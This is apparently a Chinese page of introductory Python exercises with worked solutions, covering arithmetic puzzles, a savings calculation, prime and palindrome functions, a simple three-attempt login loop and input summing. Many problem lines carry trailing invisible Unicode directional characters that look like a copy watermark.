<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">h, f = <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split())</span><br><span class="line"><span class="keyword">if</span> f % <span class="number">2</span> != <span class="number">0</span> <span class="keyword">or</span> f &lt; <span class="number">2</span> * h <span class="keyword">or</span> f &gt; <span class="number">4</span> * h:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Data Error!&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    n = (f - <span class="number">2</span> * h) // <span class="number">2</span>  <span class="comment"># 兔的数量</span></span><br><span class="line">    m = h - n              <span class="comment"># 鸡的数量</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;有<span class="subst">&#123;m&#125;</span>只鸡，<span class="subst">&#123;n&#125;</span>只兔&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><strong>2.存款买房（B）</strong></p>
<p>你刚刚大学毕业，在北京找到了一份很好的工作，决定开始存钱买房。由于北京的房价很高，你要攒几年钱才能付得起房子的首付。‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‮‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‮‬</p>
<p>现根据以下假定来计算你需要多长时间才能攒够首付款：‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‮‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‮‬</p>
<p>1.将你想购买的房子的总价称为total_cost。‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‮‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‮‬</p>
<p>2.将首付款占总房价的比例称为portion_down_payment。为简单起见，假设portion_down_payment &#x3D; 0.30（30%）。‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‮‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‮‬</p>
<p>3.将存款金额称为current_savings。你的存款从0元开始。‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‮‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‮‬</p>
<p>4.假设你的年薪是annual_salary，按12个月平均发放，单位是元。‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‮‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‮‬</p>
<p>5.假设你每个月都要拿出一定百分比的工资来存首付。称为portion_saved，此值为一个表示百分比的整数，例如50表示50%。‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‮‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‮‬</p>
<p>6.假定你每6个月加一次工资，每半年加薪比例semi_annual_raise是一个表示百分比的整数，例如7表示7%，即第7个月的月初涨一次工资，工资涨幅为7%，以后每过6个月再涨一次工资。‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‮‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‮‬</p>
<p>写一个程序来计算你需要多少个月才能攒够钱付定金，不足一个月按一个月计算。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">total_cost = <span class="built_in">float</span>(<span class="built_in">input</span>())  <span class="comment"># total_cost为当前房价</span></span><br><span class="line">annual_salary = <span class="built_in">float</span>(<span class="built_in">input</span>())  <span class="comment"># 年薪</span></span><br><span class="line">portion_saved = <span class="built_in">float</span>(<span class="built_in">input</span>()) / <span class="number">100</span></span><br><span class="line"><span class="comment"># 月存款比例，输入30转为0.30（即30%）</span></span><br><span class="line">semi_annual_raise = <span class="built_in">float</span>(<span class="built_in">input</span>()) / <span class="number">100</span></span><br><span class="line"><span class="comment"># 输入每半年加薪比例，输入7转化为0.07（即7%）</span></span><br><span class="line">portion_down_payment = <span class="number">0.3</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 首付比例，浮点数</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据首付款比例计算首付款down_payment</span></span><br><span class="line"><span class="comment"># =======================================================</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">down_payment</span>():</span><br><span class="line">    down_payment = total_cost * portion_down_payment</span><br><span class="line">    <span class="keyword">return</span> down_payment</span><br><span class="line"></span><br><span class="line"><span class="comment"># =======================================================</span></span><br><span class="line">down_payment = down_payment()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;首付&#x27;</span>, down_payment)</span><br><span class="line"> </span><br><span class="line">current_savings = <span class="number">0</span></span><br><span class="line"><span class="comment"># 存款金额，从0开始</span></span><br><span class="line">number_of_months = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">monthly_salary = annual_salary / <span class="number">12</span>  <span class="comment">#月工资</span></span><br><span class="line">monthly_deposit = monthly_salary * portion_saved  <span class="comment">#月存款</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 总共缴纳房款</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算多少个月才能存够首付款，结果为整数，不足1月按1个月计算，即向上取整</span></span><br><span class="line"><span class="comment"># 每6个月涨一次工资，每年输出年底的存款总额</span></span><br><span class="line"><span class="comment"># =======================================================</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_current</span>(<span class="params">number_of_months, monthly_salary, semi_annual_raise, monthly_deposit</span>):</span><br><span class="line">    enough = <span class="literal">True</span></span><br><span class="line">    current_saving = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> enough:</span><br><span class="line">        current_saving = current_saving + monthly_deposit  <span class="comment"># 发工资了，先给自己存一笔</span></span><br><span class="line">        <span class="keyword">if</span> current_saving &gt;= down_payment:  <span class="comment"># 存够了买房去</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;需要<span class="subst">&#123;number_of_months&#125;</span>个月可以存够首付&#x27;</span>)</span><br><span class="line">            enough = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> number_of_months % <span class="number">12</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;第&#123;&#125;个月月末有&#123;:,.0f&#125;元存款&quot;</span>.<span class="built_in">format</span>(number_of_months, current_saving))  <span class="comment"># 每12个月输出一次存款，保留0位小数，使用千分符</span></span><br><span class="line">        <span class="keyword">if</span> number_of_months % <span class="number">6</span> == <span class="number">0</span>:</span><br><span class="line">            monthly_deposit = monthly_deposit * (<span class="number">1</span> + semi_annual_raise)  <span class="comment"># 六月之期已到，加薪</span></span><br><span class="line">        number_of_months = number_of_months + <span class="number">1</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># =======================================================</span></span><br><span class="line">print_current(number_of_months, monthly_salary, semi_annual_raise, monthly_deposit)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算存款总额</span></span><br></pre></td></tr></table></figure>

<p><strong>3.素数问题</strong></p>
<p><strong>描述</strong>‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‮‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‮‬</p>
<p>素数或称质数，是指一个大于1的整数，除1和它本身外，不能被其他的正整数所整除。 素数判定方法是： 先用一定的方法枚举正整数n所有可能的真因子，并验证每个枚举的数是否为真因子。若是，则停止枚举，确定n为合数；若枚举完也没发现真因子，可确定n为素数。完成以下函数的定义并按要求完成问题：‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‮‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‮‬</p>
<ol>
<li>定义素数函数is_ prime(n) 将素数的判定代码定义为一个函数，接受用户输入的正整数n，返回n是否是素数，n为素数时返回True，不是素数时返回False。 一个整数若可以进行因数分解，那么分解时得到的两个数一定是一个小于等于sqrt(n)，一个大于等于sqrt(n)，所以对于每个数n，并不需要从2判断到n-1，只需要遍历到sqrt(n)即可。因为若sqrt(n)左侧找不到因数，那么右侧也一定找不到因数,这样可以显著提升算法的效率。‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‮‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‮‬</li>
<li>定义一个函数output_prime(n)，接受一个正整数number为参数，在函数中调用问题1中定义的判定素数函数，对不大于number的整数一一判定，在同一行中输出不大于n的全部素数。此函数无返回值，直接输出找到的素数。 调用all_prime(n)函数前，先接收用户输入的一个正整数，作为函数调用时的参数。‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‮‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‮‬</li>
<li>定义寻找回文素数函数 回文是指数或者字符串具有首尾回环性质，从后向前按位颠倒后与原文一样。首尾回环的数字就是回文数，如：12321；首尾回环的字符串就是回文串，如：’上海自来水来自海上’。 如果一个整数是素数，同时，其对应的字符串是回文字符串时，便称其为回文素数。 编写一个函数，调用前面定义好的素数判定函数和题目给定的回文判定函数完成回文素数的判定，函数无返回值，直接输出找到的回文素数。 输入一个正整数，输出小于这个数的所有回文素数。‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‮‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‮‬</li>
<li>寻找反素数 反素数是指一个将其逆向拼写后也是一个素数的非回文数。例如：17和71都是素数且均不是回文数，所以17和71都是反素数。 输入一个正整数n，按从小到大顺序输出所有反素数。‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‮‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‮‬</li>
<li>哥德巴赫猜想1742年，哥德巴赫给欧拉的信中提出了以下猜想“任意一个大于2的整数都可写成三个质数之和”。常见的猜想陈述为欧拉的版本，即任意一个大于2的偶数都可写成两个素数之和，亦称为“强哥德巴赫猜想”或“关于偶数的哥德巴赫猜想”。 编写函数，接收一个大于2的偶数，输出两个素数，并且两个素数之和等于原来的偶数，如果有多个不同组合，则全部输出。若输入的数不是大于2的偶数，输出’Data error!’‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‮‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‮‬</li>
</ol>
<p><strong>输入输出</strong>‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‮‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‮‬</p>
<p>问题1 如果输入’素数’，再输入一个正整数n，按从小到大顺序输出不大于n的所有素数。‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‮‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‮‬</p>
<p>问题2 如果输入’回文素数’，再输入一个正整数n，按从小到大顺序输出小于n的所有回文素数。‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‮‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‮‬</p>
<p>问题3 如果输入’反素数’，再输入一个正整数n，输入一个正整数n，按从小到大顺序输出小于n的所有反素数。‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‮‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‮‬</p>
<p>问题4 如果输入’哥德巴赫猜想’，接收一个大于2的偶数，输出两个素数，并且两个素数之和等于原来的偶数，如果有多个不同组合，则全部输出，格式参考下面的示例。若输入的数不是大于2的偶数，输出’Data error!’‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‮‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‮‬</p>
<p>如果输入不是以上字符串，输出’输入错误’。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">question_judge</span>(<span class="params">question</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;接收一个字符串为参数，根据参数值判断问题类型，调用合适的函数进行操作。&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> question == <span class="string">&#x27;素数&#x27;</span>:       <span class="comment"># 如果输入素数，再输入一个正整数n，输出不大于n的所有素数</span></span><br><span class="line">        n = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">        output_prime(n)         <span class="comment"># 输出素数</span></span><br><span class="line">    <span class="keyword">elif</span> question == <span class="string">&#x27;回文素数&#x27;</span>:</span><br><span class="line">        n = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">        palindromic_prime(n)   <span class="comment"># 输出回文素数</span></span><br><span class="line">    <span class="keyword">elif</span> question == <span class="string">&#x27;反素数&#x27;</span>:</span><br><span class="line">        n = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">        reverse_prime(n)  <span class="comment"># 输出反素数</span></span><br><span class="line">    <span class="keyword">elif</span> question == <span class="string">&#x27;哥德巴赫猜想&#x27;</span>:</span><br><span class="line">        n = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">        goldbach_conjecture(n)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;输入错误&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_prime</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;判断素数的函数,接收一个正整数为参数，参数是素数时返回True，否则返回False</span></span><br><span class="line"><span class="string">    减小判定区间，减少循环次数，提升效率&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="built_in">int</span>(n**<span class="number">0.5</span>+<span class="number">1</span>)):  </span><br><span class="line">        <span class="keyword">if</span> n % i == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">output_prime</span>(<span class="params">number</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;接收一个正整数为参数，遍历从0到number之间的所有整数</span></span><br><span class="line"><span class="string">    在一行中输出不大于number的所有素数，函数无返回值&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(number+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> is_prime(i)==<span class="literal">True</span>:</span><br><span class="line">            <span class="built_in">print</span>(i,end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">palindromic</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;接收一个数字为参数，判定其是否为回文数，返回布尔值。&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(num) == <span class="built_in">str</span>(num)[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">palindromic_prime</span>(<span class="params">number</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;接收一个正整数参数number，遍历从0到number之间的所有整数，</span></span><br><span class="line"><span class="string">    若某个数是素数，且转为字符串后是回文字符串，则称其为回文素数</span></span><br><span class="line"><span class="string">    找出并在同一行中从小到大输出小于number的所有回文素数，各数字间用一个空格分隔，</span></span><br><span class="line"><span class="string">    函数无返回值&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(number+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> palindromic(i)==<span class="literal">True</span> <span class="keyword">and</span> is_prime(i)==<span class="literal">True</span>:</span><br><span class="line">            <span class="built_in">print</span>(i,end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_num</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;接收一个整数，返回其逆序字符串对应的整数&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(<span class="built_in">str</span>(num)[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_prime</span>(<span class="params">number</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;接收一个正整数参数，找出并在同一行内输出所有小于number的反素数，数字间用一个空格分隔。</span></span><br><span class="line"><span class="string">    反素数指某数i及其逆序数都是素数，但数i对应的字符串不是回文字符串</span></span><br><span class="line"><span class="string">    函数无返回值&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(number):</span><br><span class="line">        <span class="keyword">if</span> palindromic(i)==<span class="literal">False</span> <span class="keyword">and</span> is_prime(i)==<span class="literal">True</span> <span class="keyword">and</span> is_prime(reverse_num(i))==<span class="literal">True</span> :</span><br><span class="line">            <span class="built_in">print</span>(i,end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">goldbach_conjecture</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; 哥德巴赫猜想, 接收一个不小于4的正整数为参数。</span></span><br><span class="line"><span class="string">    当参数为不小于4的偶数时，将其分解为两个素数的加和，按小数+数的格式输出。</span></span><br><span class="line"><span class="string">    有多种组合时全部输出，但不输出重复的组合，例如输出8=3+5，不输出8=5+3。</span></span><br><span class="line"><span class="string">    参数为奇数或小于4时，输出&#x27;Data error!&#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> num %<span class="number">2</span>==<span class="number">0</span> <span class="keyword">and</span> num&gt;=<span class="number">4</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,(num//<span class="number">2</span>)+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> is_prime(i)==<span class="literal">True</span> <span class="keyword">and</span> is_prime(num-i)==<span class="literal">True</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;num&#125;</span>=<span class="subst">&#123;i&#125;</span>+<span class="subst">&#123;num-i&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;Data error!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    problems = <span class="built_in">input</span>()</span><br><span class="line">    question_judge(problems)</span><br></pre></td></tr></table></figure>

<p><strong>4.用户登录的三次机会</strong></p>
<p>给用户三次输入用户名和密码的机会，要求如下：‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‮‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‮‬</p>
<ol>
<li>如输入第一行输入用户名为 ‘<code>Kate</code>’，第二行输入密码为 ‘<code>666666</code>’，输出 ‘<code>登录成功！</code>’，退出程序；</li>
<li>当一共有 3 次输入用户名或密码不正确输出 “<code>3次用户名或者密码均有误！退出程序。</code>”。</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">correct_username = <span class="string">&#x27;Kate&#x27;</span></span><br><span class="line">correct_password = <span class="string">&#x27;666666&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> attempt <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    username = <span class="built_in">input</span>().strip()</span><br><span class="line">    password = <span class="built_in">input</span>().strip()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> username == correct_username <span class="keyword">and</span> password == correct_password:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;登录成功！&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;3次用户名或者密码均有误！退出程序。&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><strong>5.多输入数字求和</strong></p>
<p>获取用户输入一批数字，每个数字一行，即输入一个数字之后回车在下一行输入下一个数字，最后以空回车为结束（即空输入）。‪‬‪‬‪‬‪‬‪‬‮‬‫‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‮‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‮‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‮‬</p>
<p>计算这批数字的和。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">total = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    s = <span class="built_in">input</span>()</span><br><span class="line">    <span class="keyword">if</span> s == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">try</span>: </span><br><span class="line">        <span class="comment">#支持二/八/十六进制整数和十进制整数、浮点数</span></span><br><span class="line">        <span class="keyword">if</span> s.lower().startswith((<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;0o&#x27;</span>,<span class="string">&#x27;0b&#x27;</span>)):</span><br><span class="line">            num = <span class="built_in">int</span>(s,<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> s <span class="keyword">or</span> <span class="string">&#x27;e&#x27;</span> <span class="keyword">in</span> s.lower():</span><br><span class="line">            num = <span class="built_in">float</span>(s)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            num = <span class="built_in">int</span>(s)</span><br><span class="line">        total += num</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;输入无效:<span class="subst">&#123;s&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(total)</span><br></pre></td></tr></table></figure>

<p><strong>6.随机字符串</strong></p>
<p>输入两个整数，以它们的和为随机数种子，并在32-127之间（含）随机产生20个整数。‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‮‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‮‬</p>
<p>以这些数字为Unicode码产生字符，并将组成字符串输出。</p>
